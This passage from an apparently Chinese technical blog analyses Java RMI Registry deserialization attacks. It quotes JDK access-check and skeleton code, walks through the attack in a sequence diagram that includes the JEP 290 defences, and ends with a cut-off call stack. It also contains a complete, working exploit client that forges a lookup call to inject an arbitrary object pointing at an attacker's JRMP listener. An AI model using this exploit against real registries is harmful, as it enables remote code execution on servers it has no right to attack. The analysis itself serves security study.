AccessException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 取发起本次 Registry 操作的客户端主机名（RMI 运行时维护）。</span></span><br><span class="line"><span class="comment">         * 若当前并非处于远程调用上下文中，将抛出 ServerNotActiveException。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">clientHostName</span> <span class="operator">=</span> getClientHost();</span><br><span class="line">        InetAddress clientHost;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 在特权块中解析主机名，避免可能的安全管理器限制</span></span><br><span class="line">            clientHost = java.security.AccessController.doPrivileged(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">java</span>.security.PrivilegedExceptionAction&lt;InetAddress&gt;() &#123;</span><br><span class="line">                    <span class="keyword">public</span> InetAddress <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> java.net.UnknownHostException &#123;</span><br><span class="line">                        <span class="keyword">return</span> InetAddress.getByName(clientHostName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PrivilegedActionException pae) &#123;</span><br><span class="line">            <span class="comment">// 将受检异常还原抛出（此处只可能是 UnknownHostException）</span></span><br><span class="line">            <span class="keyword">throw</span> (java.net.UnknownHostException) pae.getException();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若该客户端地址尚未被允许缓存命中，则需要执行一次“本地性”校验</span></span><br><span class="line">        <span class="keyword">if</span> (allowedAccessCache.get(clientHost) == <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 0.0.0.0 / :: 等“任意本地地址”无法明确来源，直接拒绝</span></span><br><span class="line">            <span class="keyword">if</span> (clientHost.isAnyLocalAddress()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AccessException</span>(op + <span class="string">&quot; disallowed; origin unknown&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">InetAddress</span> <span class="variable">finalClientHost</span> <span class="operator">=</span> clientHost;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 在特权块中尝试绑定一个临时 ServerSocket 到“客户端地址”</span></span><br><span class="line">                <span class="comment">// 绑定成功 ⇒ 该地址属于本机网卡 ⇒ 允许并写入缓存</span></span><br><span class="line">                java.security.AccessController.doPrivileged(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">java</span>.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">                        <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">                            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                             * 若能在客户端地址上绑定 ServerSocket，</span></span><br><span class="line"><span class="comment">                             * 则该地址必为本机地址（非远程来源）。</span></span><br><span class="line"><span class="comment">                             */</span></span><br><span class="line">                            (<span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="number">0</span>, <span class="number">10</span>, finalClientHost)).close();</span><br><span class="line">                            allowedAccessCache.put(finalClientHost, finalClientHost);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (PrivilegedActionException pae) &#123;</span><br><span class="line">                <span class="comment">// 进入此分支说明绑定失败（IOException），即该地址不是本机地址 ⇒ 拒绝</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AccessException</span>(</span><br><span class="line">                    op + <span class="string">&quot; disallowed; origin &quot;</span> + clientHost + <span class="string">&quot; is non-local host&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ServerNotActiveException ex) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 无远程调用上下文：视为来自本 JVM 的本地调用，允许通过。</span></span><br><span class="line"><span class="comment">         * （例如直接在同一进程内调用 Registry 实现）</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.net.UnknownHostException ex) &#123;</span><br><span class="line">        <span class="comment">// 主机名无法解析 ⇒ 无法判定来源 ⇒ 拒绝</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AccessException</span>(op + <span class="string">&quot; disallowed; origin is unknown host&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当然 <code>list</code>、<code>lookup</code> 这些客户端正常使用的功能就没有这个限制：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// list()</span></span><br><span class="line">&#123;</span><br><span class="line">    call.releaseInputStream();</span><br><span class="line">    java.lang.String[] $result = server.list();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        java.io.<span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">true</span>);</span><br><span class="line">        out.writeObject($result);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling return&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// lookup(String)</span></span><br><span class="line">&#123;</span><br><span class="line">    java.lang.String $param_String_1;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        java.io.<span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line">        $param_String_1 = (java.lang.String) in.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.io.IOException | java.lang.ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;error unmarshalling arguments&quot;</span>, e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        call.releaseInputStream();</span><br><span class="line">    &#125;</span><br><span class="line">    java.rmi.<span class="type">Remote</span> <span class="variable">$result</span> <span class="operator">=</span> server.lookup($param_String_1);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        java.io.<span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">true</span>);</span><br><span class="line">        out.writeObject($result);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling return&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>list</code> 功能没有参数直接排除；而如果客户端直接调用 <code>lookup</code>，只能传递字符串。</p>
<p>不过我们可以直接按 <code>RegistryImpl_Stub</code> 的格式手写一个 <code>lookup</code> 方法，使其接受任意 <code>Object</code>，同时把 <code>opnum</code> 置为 <code>2</code>（<code>lookup</code> 的编号），这样就能在远程正常执行。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteRef;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ↓↓↓ 以下为 JDK 内部 API；JDK 9+ 编译/运行需 --add-exports（见文末命令）</span></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过“自造 RegistryImpl_Stub 调用”在 lookup(opnum=2) 的</span></span><br><span class="line"><span class="comment"> * 反序列化阶段“注入任意对象”。即便随后类型检查失败（lookup 期望 String），</span></span><br><span class="line"><span class="comment"> * 反序列化副作用已发生。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">regHost</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">regPort</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1) 连接注册中心</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(regHost, regPort);</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Connected to Registry &quot;</span> + regHost + <span class="string">&quot;:&quot;</span> + regPort);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 构造要注入的“任意对象”</span></span><br><span class="line">        <span class="comment">//    这里演示用 UnicastRef Stub，指向你的 JRMPListener（例如 127.0.0.1:12233）</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> buildUnicastRefStub(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">12233</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 发起“伪造的 lookup 调用”，在反序列化发生处塞入对象</span></span><br><span class="line">        lookupInject(registry, payload);</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] lookup injection sent.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 伪造一次 Registry.lookup 调用（opnum=2），把任意对象写入参数流。</span></span><br><span class="line"><span class="comment">     * 服务器端 skeleton 会在“类型检查之前”先反序列化该对象。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">lookupInject</span><span class="params">(Registry registry, Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 从 stub 实例上反射拿到内部的 RemoteRef、interfaceHash、operations</span></span><br><span class="line">        <span class="type">RemoteRef</span> <span class="variable">ref</span> <span class="operator">=</span> (RemoteRef) getFieldValue(registry, <span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">interfaceHash</span> <span class="operator">=</span> toLong(getFieldValue(registry, <span class="string">&quot;interfaceHash&quot;</span>));</span><br><span class="line">        Operation[] operations = (Operation[]) getFieldValue(registry, <span class="string">&quot;operations&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// newCall：第三个参数为 opnum=2（lookup）</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, interfaceHash);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// ★ 核心：把“任意对象”写入 lookup 的参数位置</span></span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line">                out.writeObject(obj);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 触发远程调用。注意：反序列化会在服务器端先发生，</span></span><br><span class="line">            <span class="comment">// 随后才做 String 强转（可能抛 ClassCastException/UnmarshalException）</span></span><br><span class="line">            ref.invoke(call);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | RemoteException | NotBoundException e) &#123;</span><br><span class="line">            <span class="comment">// 预期的异常：类型不匹配、未绑定等；副作用已经发生，可忽略。</span></span><br><span class="line">            <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RemoteException || e <span class="keyword">instanceof</span> ClassCastException) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnexpectedException(<span class="string">&quot;undeclared checked exception&quot;</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            ref.done(call);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构造一个最小 Remote 动态代理（Stub），其内部持有 UnicastRef，</span></span><br><span class="line"><span class="comment">     * UnicastRef 指向指定的 JRMP 端点（host:port）。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">buildUnicastRefStub</span><span class="params">(String host, <span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="comment">// 第三个参数 false：作为远端引用使用（避免某些 JDK 版本本地路径问题）</span></span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="keyword">return</span> java.lang.reflect.Proxy.newProxyInstance(</span><br><span class="line">                RMIClient.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123; Remote.class &#125;,</span><br><span class="line">                h</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 反射获取实例字段（逐级向上查找） */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object o, String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; c = o.getClass();</span><br><span class="line">        <span class="keyword">while</span> (c != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(name);</span><br><span class="line">                f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> f.get(o);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                c = c.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 统一把 Object 转 long（field 可能是 long 或字符串） */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">long</span> <span class="title function_">toLong</span><span class="params">(Object v)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (v <span class="keyword">instanceof</span> Long) <span class="keyword">return</span> (Long) v;</span><br><span class="line">        <span class="keyword">return</span> Long.parseLong(String.valueOf(v));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>攻击流程如下：</p>
<pre class="mermaid">sequenceDiagram
    autonumber

    %% ── 不同进程分组（带背景色） ──
    box rgb(230,242,255) 攻击者客户端（进程A）
      participant A as 攻击者客户端
    end

    box rgb(232,245,233) 注册中心（进程B）
      participant R_Skel as RegistryImpl_Skel / Skeleton
      participant R_CIS as ConnectionInputStream
      participant R_DGC as DGCClient（Registry内）
    end

    box rgb(255,243,224) 恶意JRMPListener（进程C）
      participant L as JRMPListener
    end

    %% ── 背景提示：bind 仅本地 ──
    note over A,R_Skel: 🔒 高版本：bind/rebind/unbind 需本机来源（checkAccess）<br/>lookup/list 无此限制，可远程触发

    %% ── 伪造 lookup 调用 ──
    A->>R_Skel: 伪造 newCall(op=lookup/2)，out.writeObject(任意对象) 🎯
    A->>R_Skel: invoke()

    R_Skel->>R_CIS: getInputStream()

    alt 旧版处理参数：readObject → 再强转 String
      R_Skel->>R_CIS: in.readObject()（先反序列化）⏩
      opt 可选防护：JEP 290（ObjectInputFilter）🛡️
        R_CIS->>R_CIS: 类名/深度/数组/引用数检查
        alt 过滤拒绝
          R_Skel-->>A: InvalidClassException / UnmarshalException 🚫
        else 过滤通过
          note right of R_CIS: RemoteObject.readObject → UnicastRef.readExternal →<br/>LiveRef.read(...) → saveRef(liveRef) 📦
        end
      end
      R_Skel-->>A: 随后强转 String 失败 → ClassCastException/UnmarshalException ⚠️
    else 新版处理参数：SharedSecrets.readString(in) 🛡️
      R_Skel->>R_Skel: 仅接受 TC_STRING / TC_LONGSTRING
      alt 来的是 TC_OBJECT 等非字符串
        R_Skel-->>A: 非字符串标记 → 直接异常（不构造任意对象） ✅🚫
      else 纯字符串
        R_Skel->>R_Skel: 正常继续 lookup 流程 ✅
      end
    end

    %% ── 收尾与 DGC 联动（仅当注入对象是 Stub 才发生） ──
    R_Skel-->>R_CIS: finally: releaseInputStream() 🧹
    alt 注入对象是 Stub（含 UnicastRef/LiveRef）
      note right of R_CIS: saveRef(liveRef) 已在读取时完成；此处批量上报 🔁
      R_CIS->>R_DGC: registerRefs(endpoint, [liveRef...]) 🔁
      R_DGC->>L: JRMP 调用 DGC.dirty(ObjID[], Lease请求) 🌐
      note over R_DGC,L: 返回值路径受版本/策略影响：<br/>正常返回走 leaseFilter 白名单 🛡️；<br/>异常返回可能更早触发反序列化 ⚠️
    else 注入对象非 Stub
      note right of R_CIS: 无 DGC 联动（无 LiveRef） ✅
    end</pre>

<p>调用堆栈如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">at java.net.URLStreamHandler.getHostAddress(URLStreamHandler.java:<span class="number">439</span>)</span><br><span class="line">at java.net.URLStreamHandler.hashCode(URLStreamHandler.java:<span class="number">361</span>)</span><br><span class="line">at java.net.URL.hashCode(URL.java:<span class="number">957</span>)</span><br><span class="line">at java.util.HashMap.hash(HashMap.java:<span class="number">339</span>)</span><br><span class="line">at java.util.HashMap.readObject(HashMap.java:<span class="number">1462</span>)</span><br><span class="line">at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-<span class="number">1</span>)</span><br><span class="line">at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:<span class="number">62</span>)</span><br><span class="line">at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="number">43</span>)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:<span class="number">564</span>)</span><br><span class="line">at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:<span class="number">1160</span>)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:<span class="number">2207</span>)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:<span class="number">2078</span>)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:<span class="number">1585</span>)</span><br><span class="line">at java.io.ObjectInputStream.access$<span class="number">300</span>(ObjectInputStream.java:<span class="number">222</span>)</span><br><span class="line">at java.io.ObjectInputStream$GetFieldImpl.readFields(ObjectInputStream.java:<span class="number">2525</span>)</span><br><span class="line">at java.io.ObjectInputStream.readFields(ObjectInputStream.java:<span class="number">602</span>)</span><br><span class="line">at javax.management.BadAttributeValueExpException.readObject(BadAttributeValueExpException.java:<span class="number">71</span>)</span><br><span class="line">at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-<span class="number">1</span>)</span><br><span class="line">at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:<span class="number">62</span>)</span><br><span class="line">at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="number">43</span>)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:<span class="number">564</span>)</span><br><span class="line">at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:<span class="number">1160</span>)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:<span class="number">2207</span>)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:<span class="number">2078</span>)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:<span class="number">1585</span>)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:<span class="number">422</span>)</span><br><span class="line">at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:<span class="number">252</span>)</span><br><span class="line">at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:<span class="number">375</span>)</span><br><span class="line">at sun.rmi.transport.DGCImpl_Stub.dirty(DGCImpl_Stub.java:<span class="number">109</span>)</span><br><span class="line">at sun.rmi.transport.DGCClient$EndpointEntry.makeDirtyCall(DGCClient.java:<span class="number">377</span>)</span><br><span class="line">at sun.rmi.transport.DGCClient$EndpointEntry.registerRefs(DGCClient.java:<span class="number">319</span>)</span><br><span class="line">at sun.rmi.transport.DGCClient.registerRefs(DGCClient.java:<span class="number">155</span>)</span><br><span class="line">at sun.rmi.transport.ConnectionInputStream.registerRefs(ConnectionInputStream.java:<span class="number">102</span>)</span><br><span class="line">at sun.rmi.transport.StreamRemoteCall.releaseInputStream(StreamRemoteCall.java:<span class="number">157</span>)</span><br><span class="line">at sun.rmi.registry.RegistryImpl_Skel.dispatch(RegistryImpl_Skel.java:<span class="number">113</span>)</span><br><span class="line">at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:<span class="number">467</span>)</span><br><span class="line">at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:<span class="number">297</span>)</span><br><span class="line">at sun.rmi.transport.Transport$<span class="number">1.</span>run(Transport.java:<span class="number">200</span>)</span><br><span class="line">at sun.rmi.transport.Transport$<span class="number">1.</span>run(Transport.java:<span class="number">197</span>)</span><br><span class="line">at java.security.AccessController.doPrivileged(AccessController.java:-<span class="number">1</span>)</span><br><span class="line">at sun.rmi.transport.Transport.serviceCall(Transport.java:<span class="number">196</span>)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:<span class="number">567</span>)</span><br><span class="line">at 